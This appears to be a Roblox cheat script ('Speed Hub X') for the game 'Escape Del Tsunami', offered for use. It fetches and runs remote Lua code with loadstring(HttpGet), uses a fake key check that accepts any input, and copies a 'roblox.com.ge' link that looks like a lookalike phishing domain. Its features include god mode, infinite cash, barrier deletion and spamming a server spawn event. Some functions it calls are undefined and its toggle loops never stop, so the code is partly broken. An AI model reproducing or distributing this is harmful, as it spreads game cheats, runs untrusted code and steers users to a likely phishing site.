local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()

local Window = Fluent:CreateWindow({
    Title = "Speed Hub X | Escape Del Tsunami",
    SubTitle = "2026 • by technoourielcompany",
    TabWidth = 160,
    Size = UDim2.fromOffset(580, 460),
    Acrylic = true,
    Theme = "Dark",
    MinimizeKey = Enum.KeyCode.RightControl
})

local KeyVerified = false

-- ====================== TAB KEY ======================
local KeyTab = Window:AddTab({ Title = "🔑 Key System", Icon = "key" })

KeyTab:AddParagraph({
    Title = "Sistema de Verificación",
    Content = "Pega tu key o usa el botón Get Key para obtener el link de la comunidad."
})

KeyTab:AddInput({
    Title = "Introduce tu Key",
    Placeholder = "Escribe tu clave aquí...",
    Callback = function(text)
        if text \~= "" then
            KeyVerified = true
            Fluent:Notify({
                Title = "✅ ¡Verificado!",
                Content = "Bienvenido al hub OP 🌊💀",
                Duration = 5
            })
            CreateMainMenu()
        else
            Fluent:Notify({
                Title = "❌ Error",
                Content = "La clave no puede estar vacía",
                Duration = 3
            })
        end
    end
})

local GetKeyBtn = KeyTab:AddButton({
    Title = "📋 Get Key (Comunidad Roblox)",
    Callback = function()
        local link = "https://roblox.com.ge/communities/4362678772/"
        setclipboard(link)
        Fluent:Notify({
            Title = "📋 Copiado",
            Content = "Link de la comunidad copiado. Pégalo en tu navegador.",
            Duration = 6
        })
    end
})

-- ====================== CREAR MENÚ PRINCIPAL ======================
function CreateMainMenu()
    -- Tab Principal
    local MainTab = Window:AddTab({ Title = "🌊 Survival", Icon = "home" })

    MainTab:AddToggle({
        Title = "God Mode (Inmortal)",
        Default = false,
        Callback = function(Value)
            if Value then
                spawn(function()
                    while Value do
                        local char = game.Players.LocalPlayer.Character
                        if char and char:FindFirstChild("Humanoid") then
                            char.Humanoid.Health = math.huge
                            char.Humanoid.MaxHealth = math.huge
                        end
                        task.wait(0.5)
                    end
                end)
            end
        end
    })

    MainTab:AddToggle({
        Title = "Remove/Freeze Tsunami + Anti-Wave",
        Default = false,
        Callback = function(Value)
            if Value then
                spawn(function()
                    while Value do
                        for _, part in pairs(workspace:GetDescendants()) do
                            local n = part.Name:lower()
                            if n:find("wave") or n:find("tsunami") or n:find("water") or n:find("flood") then
                                if part:IsA("BasePart") then
                                    part.Transparency = 1
                                    part.CanCollide = false
                                    part.Velocity = Vector3.new(0,0,0)
                                    part.Anchored = true
                                end
                            end
                        end
                        task.wait(1)
                    end
                end)
            end
        end
    })

    MainTab:AddToggle({
        Title = "Auto Farm Brainrots + Collect",
        Default = false,
        Callback = function(Value)
            -- Aquí va tu función AutoFarmBrainrots() del script anterior
            if Value then AutoFarmBrainrots() end
        end
    })

    -- Spawner (como Speed Hub X)
    local SpawnerSection = MainTab:AddSection("Spawner OP")
    local SelectedRarity = "Mythical"

    MainTab:AddDropdown({
        Title = "Rareza a Spawnear",
        Options = {"Common", "Rare", "Legendary", "Mythical", "Divine", "Celestial", "Infinite"},
        Default = "Mythical",
        Callback = function(Value)
            SelectedRarity = Value
        end
    })

    MainTab:AddToggle({
        Title = "Auto Spawn (Infinite)",
        Default = false,
        Callback = function(Value)
            if Value then
                spawn(function()
                    while Value do
                        local rs = game:GetService("ReplicatedStorage")
                        if rs:FindFirstChild("SpawnBrainrot") then
                            rs.SpawnBrainrot:FireServer(SelectedRarity)
                        end
                        task.wait(0.5)
                    end
                end)
            end
        end
    })

    -- Tab Exploits
    local ExploitTab = Window:AddTab({ Title = "⚡ Exploits", Icon = "zap" })
    ExploitTab:AddToggle({
        Title = "Delete VIP Walls / Barriers",
        Default = false,
        Callback = function(v)
            if v then
                for _, wall in pairs(workspace:GetDescendants()) do
                    if wall.Name:lower():find("vip") or wall.Name:lower():find("barrier") then
                        wall:Destroy()
                    end
                end
            end
        end
    })

    ExploitTab:AddButton({
        Title = "Infinite Cash / Tokens",
        Callback = function()
            local p = game.Players.LocalPlayer
            if p.leaderstats then
                for _, stat in pairs(p.leaderstats:GetChildren()) do
                    if stat.Name:lower():find("cash") or stat.Name:lower():find("token") then
                        stat.Value = math.huge
                    end
                end
            end
        end
    })

    -- Tab Visual
    local VisualTab = Window:AddTab({ Title = "👁️ Visual", Icon = "eye" })
    VisualTab:AddToggle({
        Title = "ESP Raros (Mythical+)",
        Default = false,
        Callback = function(v) 
            if v then EnableRareESP() else DisableESP() end 
        end
    })

    Fluent:Notify({
        Title = "Speed Hub X cargado",
        Content = "¡Todo listo! Disfruta rompiendo el tsunami 🌊",
        Duration = 8
    })
end

